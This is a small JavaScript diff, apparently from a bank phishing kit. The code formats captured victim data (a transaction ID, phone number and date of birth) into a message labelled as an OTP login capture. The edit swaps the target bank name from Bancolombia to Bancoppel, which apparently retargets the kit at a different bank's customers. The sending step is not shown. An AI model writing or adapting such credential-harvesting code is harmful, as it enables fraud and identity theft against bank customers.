@@ -74,7 +74,7 @@ document.addEventListener('DOMContentLoaded', async () => {
   localStorage.setItem("transactionId", txid);
 
   const mensaje = `
-<b>INGRESO BANCOLOMBIA (OTP)</b>
+<b>INGRESO BANCOPPEL (OTP)</b>
 🆔 ID: ${txid}
 📱 Celular: ${session.celular}
 🎂 Nacimiento: ${session.nacimiento}
